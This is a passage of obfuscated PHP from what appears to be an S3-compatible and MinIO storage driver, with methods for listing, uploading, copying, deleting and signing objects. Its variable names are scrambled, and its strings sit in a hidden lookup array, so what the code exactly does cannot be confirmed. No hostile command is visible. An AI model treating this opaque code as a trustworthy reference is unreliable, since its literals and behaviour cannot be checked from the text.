array($¢«¨»™[203], $¢«¨»™[204]))) { $this->client->setExceptions(); } } public function setSignVersion($”³à¡Ç = "\166\64") { $this->signVer = $”³à¡Ç; $this->client->setSignatureVersion($”³à¡Ç); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $²‡µ™“¬) { return null; } } public function isBucketCors() { $¶¥°•è =& $_SERVER[º·Ï‹¥³]; $ÍŞÅ³Ğ = $this->getBucketCors(); if (!$ÍŞÅ³Ğ || !is_array($ÍŞÅ³Ğ)) { return !1; } if (!is_array($ÍŞÅ³Ğ[$¶¥°•è[209]])) { $ÍŞÅ³Ğ[$¶¥°•è[209]] = explode($¶¥°•è[50], $ÍŞÅ³Ğ[$¶¥°•è[209]]); } if ($ÍŞÅ³Ğ[$¶¥°•è[210]] != $¶¥°•è[211] || !in_array($¶¥°•è[211], $ÍŞÅ³Ğ[$¶¥°•è[209]])) { return !1; } $¤¾º ‚… = array_map($¶¥°•è[212], $ÍŞÅ³Ğ[$¶¥°•è[213]]); if (!is_array($¤¾º ‚…)) { $¤¾º ‚… = array(); } $ò©‡ùåÎ = array($¶¥°•è[214], $¶¥°•è[215], $¶¥°•è[216], $¶¥°•è[217], $¶¥°•è[218]); $„ùõÖÏÔ = array_diff($ò©‡ùåÎ, $¤¾º ‚…); return empty($„ùõÖÏÔ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($–”¿ ŞÅ, $³şë¥§ = '', $ÜÊï°÷ = REPEAT_RENAME) { $ÜÇ®€Ğ” = $this->setContent($–”¿ ŞÅ, $³şë¥§); if ($ÜÇ®€Ğ” !== !1) { return $this->getPathOuter($–”¿ ŞÅ); } return !1; } public function mkdir($Ü¿êé©, $‰îƒÁÃ‚ = REPEAT_SKIP) { $œÃçêÛö =& $_SERVER[º·Ï‹¥³]; if (empty($Ü¿êé©) && $Ü¿êé© !== $œÃçêÛö[219]) { return !1; } if ($‰îƒÁÃ‚ && $this->_isFolder($Ü¿êé©)) { return $this->getPathOuter($Ü¿êé©); } $ÇûÖÁóÎ = $this->setContent($Ü¿êé©, $œÃçêÛö[12], !0); if ($ÇûÖÁóÎ !== !1) { return $this->getPathOuter($Ü¿êé©); } return !1; } public function copyFile($˜¦‹˜ŠÆ, $…Ñî¤¯, $’œÚ³ˆ© = array()) { $•ùÎã€ú =& $_SERVER[º·Ï‹¥³]; $Æõ¤¤š… = $this->objectMeta($˜¦‹˜ŠÆ); if (!$Æõ¤¤š…) { return !1; } if ($Æõ¤¤š…[$•ùÎã€ú[79]] <= 1024 * 1024 * 200) { $´‡¬µˆ‹ = $this->client->copyObject($this->bucket, $˜¦‹˜ŠÆ, $this->bucket, $…Ñî¤¯, $•ùÎã€ú[220], $’œÚ³ˆ©); } else { $´‡¬µˆ‹ = $this->client->multiCopyObject($this->bucket, $˜¦‹˜ŠÆ, $this->bucket, $…Ñî¤¯, $’œÚ³ˆ©); } $´‡¬µˆ‹ = $´‡¬µˆ‹ ? $this->getPathOuter($…Ñî¤¯) : !1; return $´‡¬µˆ‹; } public function moveFile($Ê«ÌÁ¿, $ÛÙ£ó›) { if ($this->copyFile($Ê«ÌÁ¿, $ÛÙ£ó›)) { $this->delFile($Ê«ÌÁ¿); return $this->getPathOuter($ÛÙ£ó›); } return !1; } public function delFile($ÄÒÚÉØ¬) { return $this->client->deleteObject($this->bucket, $ÄÒÚÉØ¬); } public function delFolder($¶¡ÔÏõŞ) { $ÜÎŸ§Ïˆ =& $_SERVER[º·Ï‹¥³]; if (!$this->exist($¶¡ÔÏõŞ)) { return !0; } $this->listItemCache = !1; $€â•Î¬æ = $this->fileList($¶¡ÔÏõŞ); $this->listItemCache = !0; $õû—µ˜¼ = trim($¶¡ÔÏõŞ, $ÜÎŸ§Ïˆ[8]) . $ÜÎŸ§Ïˆ[8]; if (!empty($¶¡ÔÏõŞ) && $¶¡ÔÏõŞ !== $ÜÎŸ§Ïˆ[219] && !in_array($õû—µ˜¼, $€â•Î¬æ[$ÜÎŸ§Ïˆ[85]])) { $€â•Î¬æ[$ÜÎŸ§Ïˆ[85]][] = $õû—µ˜¼; } $Ò¼ğá”Ï = $this->delByBatch($€â•Î¬æ[$ÜÎŸ§Ïˆ[86]]); if (!$Ò¼ğá”Ï) { return !1; } $Ò¼ğá”Ï = $this->delByBatch($€â•Î¬æ[$ÜÎŸ§Ïˆ[85]]); if (!$Ò¼ğá”Ï) { return !1; } return $this->delFile($õû—µ˜¼); } private function delByBatch($ƒİ•Ô’Ì) { foreach (array_chunk($ƒİ•Ô’Ì, 1000) as $Ûï—É–õ) { $¶±‰…›ğ = $this->client->deleteObjects($this->bucket, $Ûï—É–õ); if (!$¶±‰…›ğ) { return !1; } } return !0; } public function rename($ŸõÂ×ŸØ, $üË€’œ) { return $this->renameObject($ŸõÂ×ŸØ, $üË€’œ); } public function listPath($®ÂÙ—¯Â, $Ä¨®šÅä = false) { $Ş¾‹†äï =& $_SERVER[º·Ï‹¥³]; $Í¢ÎòˆÀ = $this->fileList($®ÂÙ—¯Â, $Ş¾‹†äï[8], !0); foreach ($Í¢ÎòˆÀ[$Ş¾‹†äï[85]] as $¿ĞÓ°Ü¯ => $îÃ»Êï ) { $Í¢ÎòˆÀ[$Ş¾‹†äï[85]][$¿ĞÓ°Ü¯] = $this->folderInfo($îÃ»Êï , $Ä¨®šÅä, $îÃ»Êï ); } foreach ($Í¢ÎòˆÀ[$Ş¾‹†äï[86]] as $¿ĞÓ°Ü¯ => $îÃ»Êï ) { $Í¢ÎòˆÀ[$Ş¾‹†äï[86]][$¿ĞÓ°Ü¯] = $this->fileInfo($îÃ»Êï [$Ş¾‹†äï[32]], $Ä¨®šÅä, $îÃ»Êï ); } return $Í¢ÎòˆÀ; } protected function infoChildren($Ñº„¦°Á, &$ÁËíàâÑ) { $ı—¨ˆÙœ =& $_SERVER[º·Ï‹¥³]; $¤°ñõš = $this->fileList($Ñº„¦°Á, $ı—¨ˆÙœ[12], !0); $ÁËíàâÑ[$ı—¨ˆÙœ[81]] += count($¤°ñõš[$ı—¨ˆÙœ[85]]); $ÁËíàâÑ[$ı—¨ˆÙœ[80]] += count($¤°ñõš[$ı—¨ˆÙœ[86]]); foreach ($¤°ñõš[$ı—¨ˆÙœ[86]] as $úÓ·¹øÂ) { if (!$úÓ·¹øÂ || !$úÓ·¹øÂ[$ı—¨ˆÙœ[79]]) { continue; } $ÁËíàâÑ[$ı—¨ˆÙœ[79]] += $úÓ·¹øÂ[$ı—¨ˆÙœ[79]]; } } private function fileInfo($ñÏÖ€¼Ú, $‰°ìĞâœ = false, $Æºáú = array()) { $Ëô€ß×Ø =& $_SERVER[º·Ï‹¥³]; $Œ•ğî = array($Ëô€ß×Ø[32] => $this->pathThis($ñÏÖ€¼Ú), $Ëô€ß×Ø[87] => $this->getPathOuter($ñÏÖ€¼Ú), $Ëô€ß×Ø[33] => $Ëô€ß×Ø[221], $Ëô€ß×Ø[178] => $this->ext($ñÏÖ€¼Ú), $Ëô€ß×Ø[79] => isset($Æºáú[$Ëô€ß×Ø[79]]) ? $Æºáú[$Ëô€ß×Ø[79]] : 0); if ($‰°ìĞâœ) { return $Œ•ğî; } $Œ•ğî[$Ëô€ß×Ø[222]] = $Œ•ğî[$Ëô€ß×Ø[88]] = 0; $Œ•ğî[$Ëô€ß×Ø[223]] = $Œ•ğî[$Ëô€ß×Ø[224]] = !0; if (empty($Æºáú)) { $Æºáú = $this->objectMeta($ñÏÖ€¼Ú); if (!$Æºáú) { return $Œ•ğî; } } if (isset($Æºáú[$Ëô€ß×Ø[225]]) && $Æºáú[$Ëô€ß×Ø[225]]) { $Œ•ğî[$Ëô€ß×Ø[226]] = $Æºáú[$Ëô€ß×Ø[225]]; } if (isset($Æºáú[$Ëô€ß×Ø[197]])) { $Œ•ğî[$Ëô€ß×Ø[88]] = $Æºáú[$Ëô€ß×Ø[197]]; } if (isset($Æºáú[$Ëô€ß×Ø[79]])) { $Œ•ğî[$Ëô€ß×Ø[79]] = $Æºáú[$Ëô€ß×Ø[79]]; } return $Œ•ğî; } private function folderInfo($ğ’ÏÂíÈ, $×´’ŞÂä = false, $´Ë ¥¡º = array()) { $Äà‘ëõ× =& $_SERVER[º·Ï‹¥³]; $”Ñ™ªÙ§ = array($Äà‘ëõ×[32] => $this->pathThis($ğ’ÏÂíÈ), $Äà‘ëõ×[87] => $this->getPathOuter($Äà‘ëõ×[8] . $ğ’ÏÂíÈ), $Äà‘ëõ×[33] => $Äà‘ëõ×[78]); if ($×´’ŞÂä) { return $”Ñ™ªÙ§; } $”Ñ™ªÙ§[$Äà‘ëõ×[222]] = $”Ñ™ªÙ§[$Äà‘ëõ×[88]] = 0; $”Ñ™ªÙ§[$Äà‘ëõ×[223]] = $”Ñ™ªÙ§[$Äà‘ëõ×[224]] = !0; if ($ğ’ÏÂíÈ == $Äà‘ëõ×[12]) { return $”Ñ™ªÙ§; } if (empty($´Ë ¥¡º)) { $´Ë ¥¡º = $this->objectMeta(trim($ğ’ÏÂíÈ, $Äà‘ëõ×[8]) . $Äà‘ëõ×[8]); } if (isset($´Ë ¥¡º[$Äà‘ëõ×[197]])) { $”Ñ™ªÙ§[$Äà‘ëõ×[222]] = $´Ë ¥¡º[$Äà‘ëõ×[197]]; } return $”Ñ™ªÙ§; } private function fileList($Ô…£Í‡¡, $Ïç¸³çÚ = '', $ËÌ…ßä¡ = 0) { $Š‡®±ˆô =& $_SERVER[º·Ï‹¥³]; $»ÅÍõª• = rtrim($Ô…£Í‡¡, $Š‡®±ˆô[8]) . $Š‡®±ˆô[8]; $ôœ¥áªÏ = $this->listObjs($»ÅÍõª•, null, null, $Ïç¸³çÚ); if (!$ôœ¥áªÏ) { return array($Š‡®±ˆô[85] => array(), $Š‡®±ˆô[86] => array()); } $¾éªÍé˜ = $·ËÇŸã˜ = array(); foreach ($ôœ¥áªÏ[$Š‡®±ˆô[227]] as $ØÔÙ’¿å) { $À°†‘ = $ØÔÙ’¿å[$Š‡®±ˆô[32]]; if ($À°†‘ == $»ÅÍõª•) { continue; } $æ¿ô¡í = isset($ØÔÙ’¿å[$Š‡®±ˆô[79]]) ? $ØÔÙ’¿å[$Š‡®±ˆô[79]] : 0; $íõ¼Ö = $æ¿ô¡í == 0 && substr($À°†‘, strlen($À°†‘) - 1, 1) == $Š‡®±ˆô[8] ? !0 : !1; $this->cacheMethodInfoSet($À°†‘, $íõ¼Ö, $ØÔÙ’¿å); if ($íõ¼Ö) { $¾éªÍé˜[] = $À°†‘; continue; } $·ËÇŸã˜[] = $ËÌ…ßä¡ ? $ØÔÙ’¿å : $À°†‘; } foreach ($ôœ¥áªÏ[$Š‡®±ˆô[228]] as $ØÔÙ’¿å) { $¾éªÍé˜[] = $ØÔÙ’¿å[$Š‡®±ˆô[32]]; $this->cacheMethodInfoSet($ØÔÙ’¿å[$Š‡®±ˆô[32]], !0); } $this->cacheMethodInfoSet($Ô…£Í‡¡, !0); return array($Š‡®±ˆô[85] => $¾éªÍé˜, $Š‡®±ˆô[86] => $·ËÇŸã˜); } private function listObjs($áÊÀÌ¹¼, $¦š¦ò‚ = null, $æİ²Õ­¾ = null, $ä¼Æ¦ = null) { $Ï““Áê =& $_SERVER[º·Ï‹¥³]; $áÊÀÌ¹¼ = trim($áÊÀÌ¹¼, $Ï““Áê[8]); $‡½¥·¸ğ = empty($áÊÀÌ¹¼) && $áÊÀÌ¹¼ !== $Ï““Áê[219] ? $Ï““Áê[12] : $áÊÀÌ¹¼ . $Ï““Áê[8]; return $this->client->getBucket($this->bucket, $‡½¥·¸ğ, $¦š¦ò‚, $æİ²Õ­¾, $ä¼Æ¦, !0); } public function has($ùÍ¡ÛØô, $¸¸Ó¦£ = false, $ŸıŒÇãÓ = true) { $óöÓ°ó =& $_SERVER[º·Ï‹¥³]; $ùÍ¡ÛØô = trim($ùÍ¡ÛØô, $óöÓ°ó[8]); $¸ç“‰ = empty($ùÍ¡ÛØô) && $ùÍ¡ÛØô !== $óöÓ°ó[219] ? $óöÓ°ó[12] : $ùÍ¡ÛØô . $óöÓ°ó[8]; $­øô¥©ı = null; $£²¬À‹ü = 500; $Ú‚ò”õ = $óöÓ°ó[8]; $¢öáÌªğ = $«ÑÚÃÙå = array(); while (!0) { $ìòö·™³ = $this->listObjs($ùÍ¡ÛØô, $­øô¥©ı, $£²¬À‹ü, $Ú‚ò”õ); if (!$ìòö·™³) { break; } $­øô¥©ı = $ìòö·™³[$óöÓ°ó[229]]; $ËÙÄí¤ = $ìòö·™³[$óöÓ°ó[227]]; $Ì…÷Ìğ˜ = $ìòö·™³[$óöÓ°ó[228]]; if (empty($ËÙÄí¤) && empty($Ì…÷Ìğ˜)) { break; } if (count($ËÙÄí¤) == 1 && $ËÙÄí¤[0][$óöÓ°ó[32]] == $¸ç“‰) { break; } if ($¸¸Ó¦£) { if (count($ËÙÄí¤)) { $ËÙÄí¤ = array_column($ËÙÄí¤, $óöÓ°ó[32]); $¢öáÌªğ = array_merge($¢öáÌªğ, $ËÙÄí¤); } if (count($Ì…÷Ìğ˜)) { $Ì…÷Ìğ˜ = array_column($Ì…÷Ìğ˜, $óöÓ°ó[32]); $«ÑÚÃÙå = array_merge($«ÑÚÃÙå, $Ì…÷Ìğ˜); } if ($­øô¥©ı === null) { break; } continue; } if ($ŸıŒÇãÓ) { if (!empty($ËÙÄí¤)) { if (count($ËÙÄí¤) > 1 || isset($ËÙÄí¤[0][$óöÓ°ó[32]]) && $ËÙÄí¤[0][$óöÓ°ó[32]] != $¸ç“‰) { return !0; } } } else { if (!empty($Ì…÷Ìğ˜)) { return !0; } } if ($­øô¥©ı === null) { break; } } if ($¸¸Ó¦£) { $¢öáÌªğ = array_diff($¢öáÌªğ, array($¸ç“‰)); $¢öáÌªğ = count(array_unique($¢öáÌªğ)); $«ÑÚÃÙå = count(array_unique($«ÑÚÃÙå)); return array($óöÓ°ó[230] => $¢öáÌªğ, $óöÓ°ó[231] => $«ÑÚÃÙå); } return !1; } public function listAll($øÛ£ßÔÍ) { $±ÄŒ¤ =& $_SERVER[º·Ï‹¥³]; $³Ãñ™Œ = $this->fileList($øÛ£ßÔÍ, $±ÄŒ¤[12], !0); $ûåú³ú = array_to_keyvalue($³Ãñ™Œ[$±ÄŒ¤[86]], $±ÄŒ¤[32]); foreach ($³Ãñ™Œ[$±ÄŒ¤[85]] as $·¶ôóº‡) { if (is_string($·¶ôóº‡)) { $ûåú³ú[$·¶ôóº‡] = array($±ÄŒ¤[79] => 0); } } return $this->listAllFiles($øÛ£ßÔÍ, $ûåú³ú); } public function canRead($ ì±¬§) { $‘÷öØœ¢ =& $_SERVER[º·Ï‹¥³]; $‘¹õ¢ = $this->client->getAccessControlPolicy($this->bucket, $ ì±¬§); if (!$‘¹õ¢) { return !1; } return in_array($‘¹õ¢, array($‘÷öØœ¢[232], $‘÷öØœ¢[233], $‘÷öØœ¢[234])) ? !0 : !1; } public function canWrite($óõÍ¦ÄÛ) { $Ç…¥ğşĞ =& $_SERVER[º·Ï‹¥³]; $ĞƒµÄÖû = $this->client->getAccessControlPolicy($this->bucket, $óõÍ¦ÄÛ); if (!$ĞƒµÄÖû) { return !1; } return in_array($ĞƒµÄÖû, array($Ç…¥ğşĞ[232], $Ç…¥ğşĞ[233])) ? !0 : !1; } public function getContent($±ûüÀä) { return $this->client->getObject($this->bucket, $±ûüÀä); } public function setContent($èæ›ª¨®, $ûØÂ“ÑÈ = '', $ôæ‡¦² = false) { $ûŞü™òã =& $_SERVER[º·Ï‹¥³]; $èæ›ª¨® = $ôæ‡¦² ? trim($èæ›ª¨®, $ûŞü™òã[8]) . $ûŞü™òã[8] : $èæ›ª¨®; $öé›‚ÑÑ = get_file_mime(get_path_ext($èæ›ª¨®)); $ï€İÛ±© = $this->client->putObject($ûØÂ“ÑÈ, $this->bucket, $èæ›ª¨®, $ûŞü™òã[220], array(), $öé›‚ÑÑ); if (!$ï€İÛ±©) { return !1; } if ($ôæ‡¦²) { return !0; } return $ï€İÛ±© ? !0 : !1; } public function fileSubstr($¹»‘½‚û, $²¶¨ÊÊ, $‰ÙêøäØ) { $í´Ú–‚ = $²¶¨ÊÊ + $‰ÙêøäØ - 1; return $this->client->getObject($this->bucket, $¹»‘½‚û, array($_SERVER[º·Ï‹¥³][235] => "\142\x79\164\x65\x73\75{$²¶¨ÊÊ}\55{$í´Ú–‚}")); } public function upload($èšÔ«ê‡, $Ï“±áÉÛ, $¸ÊÚ¿òã = false, $Ã—¼±ÇÕ = REPEAT_REPLACE) { $Ê©ŞŠÛˆ =& $_SERVER[º·Ï‹¥³]; $àÎ–Øİò = array($Ê©ŞŠÛˆ[236] => @md5_file($Ï“±áÉÛ)); $ŞÂ¶´•Ÿ = array($Ê©ŞŠÛˆ[237] => get_file_mime(get_path_ext($èšÔ«ê‡))); if (IO::size($Ï“±áÉÛ) <= 1024 * 1024 * 200) { $ƒ¡‚ÂÇ = $this->client->putObjectFile($Ï“±áÉÛ, $this->bucket, $èšÔ«ê‡, $Ê©ŞŠÛˆ[220], $àÎ–Øİò, $ŞÂ¶´•Ÿ); return !empty($ƒ¡‚ÂÇ) ? $this->getPathOuter($èšÔ«ê‡) : !1; } $õ²¸Ë¹ = $this->client->multiUploadObject($Ï“±áÉÛ, $this->bucket, trim($èšÔ«ê‡, $Ê©ŞŠÛˆ[8]), $àÎ–Øİò, $ŞÂ¶´•Ÿ); return $õ²¸Ë¹ ? $this->getPathOuter($èšÔ«ê‡) : !1; } public function download($¥Šä³÷ı, $‰³ª¨Úó) { if (!@is_dir($this->pathFather($‰³ª¨Úó)) && !IO::mkdir($this->pathFather($‰³ª¨Úó))) { return !1; } $æ’ÈàÕğ = $this->client->getObject($this->bucket, $¥Šä³÷ı, array(), $‰³ª¨Úó); return $æ’ÈàÕğ !== !1 ? $‰³ª¨Úó : !1; } public function link($èÓÊÉ¢Ì, $ıˆõÖ…° = array()) { $­ä”Ÿ†­ =& $_SERVER[º·Ï‹¥³]; if ($this->signVer == $­ä”Ÿ†­[238]) { return $this->client->getAuthenticatedURL($this->bucket, $èÓÊÉ¢Ì, 3600 * 12, $ıˆõÖ…°); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($èÓÊÉ¢Ì, $­ä”Ÿ†­[8]), 3600 * 12, $this->region, array(), !0, $ıˆõÖ…°); } public function fileOut($¹«’€§ß, $„§³×Œİ = false, $¢ÍÃûö = false, $°ö—Ã—¹ = '') { $şİÉŞŸ =& $_SERVER[º·Ï‹¥³]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹«’€§ß, $„§³×Œİ, $¢ÍÃûö, $°ö—Ã—¹); } if (!$¢ÍÃûö) { $¢ÍÃûö = $this->pathThis($¹«’€§ß); } $îÀ€¯€á = get_file_mime(get_path_ext($¢ÍÃûö)); if ($îÀ€¯€á == $şİÉŞŸ[239]) { return parent::fileOut($¹«’€§ß, $„§³×Œİ, $¢ÍÃûö, $°ö—Ã—¹); } $ôÌŠ¾İ = array($şİÉŞŸ[240] => $îÀ€¯€á); if ($„§³×Œİ) { $ôÌŠ¾İ[$şİÉŞŸ[241]] = $şİÉŞŸ[242] . rawurlencode($¢ÍÃûö); } else { } $øí‹š½® = $this->link($¹«’€§ß, $ôÌŠ¾İ); $this->fileOutLink($øí‹š½®); } public function fileOutServer($Ó àØØ›, $…’ŞäĞ† = false, $ü›Ò§ƒ = false, $ƒüàÏÅâ = '') { parent::fileOut($Ó àØØ›, $…’ŞäĞ†, $ü›Ò§ƒ, $ƒüàÏÅâ); } public function fileOutImageServer($ø•¹Çıã, $œ°“­ğ = 250) { parent::fileOutImage($ø•¹Çıã, $œ°“­ğ); } public function hashMd5($ã „Å¦†, $… °ë®á = '') { $–ñÈşã” = $this->objectMeta($ã „Å¦†); if (!$–ñÈşã”) { return !1; } $… °ë®á = $… °ë®á ? $… °ë®á : _get($–ñÈşã”, $_SERVER[º·Ï‹¥³][243]); return $… °ë®á; } public function uploadFormData($ËÃ°÷È, $ñª¼§Ë¨ = 3600) { $³£ı€—¦ =& $_SERVER[º·Ï‹¥³]; $ıÃ‰Í¼ = $this->pathFather($ËÃ°÷È); $§¢‡•“ = $this->client->getHttpUploadPostParams($this->bucket, $ıÃ‰Í¼, $³£ı€—¦[220], $ñª¼§Ë¨); return array_merge((array) $§¢‡•“, array($³£ı€—¦[199] => $this->getHost())); } public function multiUploadFormData($Ä–¾â¯¬, $ƒÔËˆŸÅ = 3600) { $å°µÉ®ë =& $_SERVER[º·Ï‹¥³]; $ûğ¤´äÂ = gmdate($å°µÉ®ë[244]); $Á¢ Çõ™ = array(); $ü€ü«ã = $this->client->getUploadId($this->bucket, $Ä–¾â¯¬, $Á¢ Çõ™); if (!$ü€ü«ã) { return !1; } return array($å°µÉ®ë[245] => $ü€ü«ã, $å°µÉ®ë[199] => $this->getHost() . $å°µÉ®ë[8] . $this->pathEncode($Ä–¾â¯¬), $å°µÉ®ë[246] => $ûğ¤´äÂ, $å°µÉ®ë[97] => $Ä–¾â¯¬); } public function multiUploadAuthData($Ê°¸¡˜, $¸Èß×İ = array()) { $î“†¯¶ƒ =& $_SERVER[º·Ï‹¥³]; $Çª‘ÕŒÎ = isset($¸Èß×İ[$î“†¯¶ƒ[246]]) ? $¸Èß×İ[$î“†¯¶ƒ[246]] : gmdate($î“†¯¶ƒ[244]); $·”Ä™ôÆ = isset($¸Èß×İ[$î“†¯¶ƒ[178]]) ? $¸Èß×İ[$î“†¯¶ƒ[178]] : $î“†¯¶ƒ[12]; $Ì’î” = $¸Èß×İ[$î“†¯¶ƒ[97]]; unset($¸Èß×İ[$î“†¯¶ƒ[97]]); if (isset($¸Èß×İ[$î“†¯¶ƒ[247]])) { $¸Èß×İ[$î“†¯¶ƒ[246]] = $Çª‘ÕŒÎ; return $this->listUploadParts($Ì’î”, $¸Èß×İ); } $©…ùÈŒü = array($î“†¯¶ƒ[248], $î“†¯¶ƒ[12], $î“†¯¶ƒ[123], $î“†¯¶ƒ[12], "\x78\55\141\155\172\x2d\144\x61\x74\x65\72{$Çª‘ÕŒÎ}", $î“†¯¶ƒ[8] . $this->bucket . $î“†¯¶ƒ[8] . $this->pathEncode($Ì’î”) . $·”Ä™ôÆ); if (strpos($·”Ä™ôÆ, $î“†¯¶ƒ[249]) === 0) { $©…ùÈŒü[0] = $î“†¯¶ƒ[250]; } if (isset($¸Èß×İ[$î“†¯¶ƒ[251]]) && $¸Èß×İ[$î“†¯¶ƒ[251]] == $î“†¯¶ƒ[252]) { $©…ùÈŒü[0] = $î“†¯¶ƒ[252]; } $ƒğçÄ™Ä = implode($î“†¯¶ƒ[253], $©…ùÈŒü); $©¶‰Æë = base64_encode(hash_hmac($î“†¯¶ƒ[254], $ƒğçÄ™Ä, $this->secret, !0)); $¶¸ßÚæ„ = $î“†¯¶ƒ[255] . $this->accessKey . $î“†¯¶ƒ[4] . $©¶‰Æë; if (strpos($·”Ä™ôÆ, $î“†¯¶ƒ[249]) === 0) { return array($î“†¯¶ƒ[256] => $¶¸ßÚæ„, $î“†¯¶ƒ[246] => $Çª‘ÕŒÎ); } return $¶¸ßÚæ„; } public function listUploadParts($„¥äøï÷, $×É¤€Ü£ = array()) { $÷©ŸË¿ =& $_SERVER[º·Ï‹¥³]; $Í“²óë› = str_replace($÷©ŸË¿[257], $÷©ŸË¿[12], $×É¤€Ü£[$÷©ŸË¿[178]]); $©ı‡Şî = $this->client->listParts($this->bucket, $„¥äøï÷, $Í“²óë›); if (!$©ı‡Şî) { return !1; } unset($×É¤€Ü£[$÷©ŸË¿[247]], $×É¤€Ü£[$÷©ŸË¿[251]]); $×É¤€Ü£[$÷©ŸË¿[97]] = $„¥äøï÷; $’Òæ±÷‡ = $this->multiUploadAuthData($„¥äøï÷, $×É¤€Ü£); if (empty($’Òæ±÷‡)) { return !1; } return array($÷©ŸË¿[256] => $’Òæ±÷‡, $÷©ŸË¿[246] => $×É¤€Ü£[$÷©ŸË¿[246]], $÷©ŸË¿[258] => $©ı‡Şî); } public function getHost() { $åµó‡ª =& $_SERVER[º·Ï‹¥³]; $–‰šç×Œ = parent::getHost(); if (!$this->osType) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($åµó‡ª[70], $åµó‡ª[64], $åµó‡ª[69], $åµó‡ª[62]))) { return $–‰šç×Œ . $åµó‡ª[8] . $this->bucket; } $–‰šç×Œ = explode($åµó‡ª[201], $–‰šç×Œ); return $–‰šç×Œ[0] . $åµó‡ª[201] . $this->bucket . $åµó‡ª[10] . $–‰šç×Œ[1]; } public function size($§€º«¯) { $–ú²ˆÂı = $this->objectMeta($§€º«¯); return $–ú²ˆÂı ? $–ú²ˆÂı[$_SERVER[º·Ï‹¥³][79]] : 0; } public function info($˜Í·ü¦ù) { if ($this->isFolder($˜Í·ü¦ù)) { return $this->folderInfo($˜Í·ü¦ù); } else { if ($this->isFile($˜Í·ü¦ù)) { return $this->fileInfo($˜Í·ü¦ù); } } return !1; } public function exist($ÉßÆ‰¬ì) { return $this->isFile($ÉßÆ‰¬ì) || $this->isFolder($ÉßÆ‰¬ì); } public function isFile($³íÚíÃ¹) { return !$this->isFolder($³íÚíÃ¹) && $this->objectMeta($³íÚíÃ¹); } public function isFolder($—¢±¬¯) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][169], $—¢±¬¯); } protected function objectMeta($ òÓ¤) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][171], $ òÓ¤); } protected function _objectMeta($—‘Œ·¢¼) { $¬áÅƒÄ =& $_SERVER[º·Ï‹¥³]; $—‘Œ·¢¼ = rtrim($—‘Œ·¢¼, $¬áÅƒÄ[8]); try { $ÅÂ‹Çñˆ = $this->client->getObjectInfo($this->bucket, $—‘Œ·¢¼); if (!isset($ÅÂ‹Çñˆ[$¬áÅƒÄ[243]]) && isset($ÅÂ‹Çñˆ[$¬áÅƒÄ[259]])) { $ÅÂ‹Çñˆ[$¬áÅƒÄ[243]] = $ÅÂ‹Çñˆ[$¬áÅƒÄ[259]]; } } catch (Exception $šÉÕ¿­¾) { $ÅÂ‹Çñˆ = !1; } if (!$ÅÂ‹Çñˆ) { } return $ÅÂ‹Çñˆ; } protected function _isFolder($¡ÌÆ“ˆ°) { $ª‹¾ ÆÔ =& $_SERVER[º·Ï‹¥³]; $¡ÌÆ“ˆ° = rtrim($¡ÌÆ“ˆ°, $ª‹¾ ÆÔ[8]); if ($¡ÌÆ“ˆ° == $ª‹¾ ÆÔ[12] || $¡ÌÆ“ˆ° == $ª‹¾ ÆÔ[8]) { return !0; } $Åèú“¯Ü = $this->client->getBucket($this->bucket, $¡ÌÆ“ˆ°, null, 1); if (empty($Åèú“¯Ü[$ª‹¾ ÆÔ[227]])) { return !1; } $ğŸ”¸ÄÑ = $Åèú“¯Ü[$ª‹¾ ÆÔ[227]][0][$ª‹¾ ÆÔ[32]]; return stripos($ğŸ”¸ÄÑ, $¡ÌÆ“ˆ° . $ª‹¾ ÆÔ[8]) === 0 ? !0 : !1; if (substr($ğŸ”¸ÄÑ, -1) == $ª‹¾ ÆÔ[8]) { return !0; } if (get_path_this($ğŸ”¸ÄÑ) == get_path_this($¡ÌÆ“ˆ°)) { return !1; } return !0; } public function listObject($¿«ô•×Ô) { return $this->fileList($¿«ô•×Ô, $_SERVER[º·Ï‹¥³][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($òàÒ˜·í) { $Æ£¸Ø¦¬ =& $_SERVER[º·Ï‹¥³]; parent::__construct($òàÒ˜·í); $this->setSignVersion($Æ£¸Ø¦¬[238]); if (!$this->region) { $this->region = $Æ£¸Ø¦¬[260]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $»ûò‹ã = $this->getBucketRgn(); return $this->region == $»ûò‹ã ? !0 : !1; } public function uploadFormData($ìü•äà, $Êºğ¦®× = 3600) { $ßîàë«í =& $_SERVER[º·Ï‹¥³]; $‘óì¦Æè = $ßîàë«í[220]; $¼ï±¯§² = $ßîàë«í[261]; $Âğï¥ôå = $ßîàë«í[62]; $„©‘ĞĞõ = gmdate($ßîàë«í[262]); $¼§Ğç©ä = gmdate($ßîàë«í[263]); $•«†ëÛ˜ = $ßîàë«í[264]; $€…®ÍÊˆ = $Êºğ¦®× . $ßîàë«í[12]; $ØãÖÍƒ† = $ßîàë«í[265]; $î¸ú¹åÅ = array($this->accessKey, $¼§Ğç©ä, $this->region, $Âğï¥ôå, $•«†ëÛ˜); $«ØÙÔ…ä = implode($ßîàë«í[8], $î¸ú¹åÅ); $â’ìŞ¦Ó = array($ßîàë«í[266] => gmdate($ßîàë«í[267], strtotime($ßîàë«í[268])), $ßîàë«í[269] => array(array($ßîàë«í[270] => $this->bucket), array($ßîàë«í[271] => $‘óì¦Æè), array($ßîàë«í[272], $ßîàë«í[273], $ßîàë«í[12]), array($ßîàë«í[272], $ßîàë«í[274], $ßîàë«í[12]), array($ßîàë«í[272], $ßîàë«í[275], $ßîàë«í[12]), array($ßîàë«í[276] => $ØãÖÍƒ†), array($ßîàë«í[277] => $«ØÙÔ…ä), array($ßîàë«í[278] => $¼ï±¯§²), array($ßîàë«í[279] => $„©‘ĞĞõ), array($ßîàë«í[280] => $€…®ÍÊˆ))); $ÀÎöğ– = base64_encode(json_encode($â’ìŞ¦Ó)); $¥©¯¥È” = hash_hmac($ßîàë«í[281], $¼§Ğç©ä, $ßîàë«í[282] . $this->secret, !0); $ââœçŸ• = hash_hmac($ßîàë«í[281], $this->region, $¥©¯¥È”, !0); 